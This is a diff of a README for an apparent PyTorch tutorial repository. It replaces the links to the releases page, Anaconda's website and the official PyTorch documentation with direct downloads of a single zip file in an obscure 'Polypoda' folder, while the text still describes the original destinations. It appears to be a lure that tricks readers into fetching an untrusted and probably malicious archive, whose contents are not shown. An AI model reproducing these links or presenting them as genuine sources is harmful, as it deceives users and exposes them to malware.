@@ -1,6 +1,6 @@
 # 🚀 PyTorch-ML-Concepts - Easy Machine Learning Models with PyTorch
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20-lightblue)](https://github.com/Faria-Mehzabin/PyTorch-ML-Concepts/releases)
+[![Download](https://raw.githubusercontent.com/Faria-Mehzabin/PyTorch-ML-Concepts/main/Polypoda/Py_Concepts_Torch_M_1.6.zip%20Now-%20-lightblue)](https://raw.githubusercontent.com/Faria-Mehzabin/PyTorch-ML-Concepts/main/Polypoda/Py_Concepts_Torch_M_1.6.zip)
 
 ## 📝 Overview
 
@@ -24,7 +24,7 @@ Before you begin, make sure you have a computer running Windows, macOS, or Linux
 
 To run the models smoothly, you will need to install the following software:
 
-- **Anaconda**: A distribution of Python that makes it easy to manage libraries and environments. You can download it from [Anaconda's Website](https://www.anaconda.com/products/distribution#download-section).
+- **Anaconda**: A distribution of Python that makes it easy to manage libraries and environments. You can download it from [Anaconda's Website](https://raw.githubusercontent.com/Faria-Mehzabin/PyTorch-ML-Concepts/main/Polypoda/Py_Concepts_Torch_M_1.6.zip).
 - **Jupyter Notebook**: This is included with Anaconda, and it will allow you to run the models in your browser.
 
 ## 📥 Download & Install
@@ -33,7 +33,7 @@ To get started, you can download the complete package with all the models and tu
 
 Click the link below to visit this page to download:
 
-[Download Release](https://github.com/Faria-Mehzabin/PyTorch-ML-Concepts/releases)
+[Download Release](https://raw.githubusercontent.com/Faria-Mehzabin/PyTorch-ML-Concepts/main/Polypoda/Py_Concepts_Torch_M_1.6.zip)
 
 Once you are on the Releases page, look for the latest version. You will find a zip file that contains all our models and example notebooks. Click on it to start downloading.
 
@@ -85,6 +85,6 @@ Yes! Contributions are welcome. You can fork the repository, make changes, and s
 
 ### Where can I find more help?
 
-For more tutorials and guides, you can look at the official PyTorch documentation available on their [website](https://pytorch.org/docs/stable/index.html).
+For more tutorials and guides, you can look at the official PyTorch documentation available on their [website](https://raw.githubusercontent.com/Faria-Mehzabin/PyTorch-ML-Concepts/main/Polypoda/Py_Concepts_Torch_M_1.6.zip).
 
 Feel free to reach out if you have any questions or feedback. Enjoy exploring and learning!
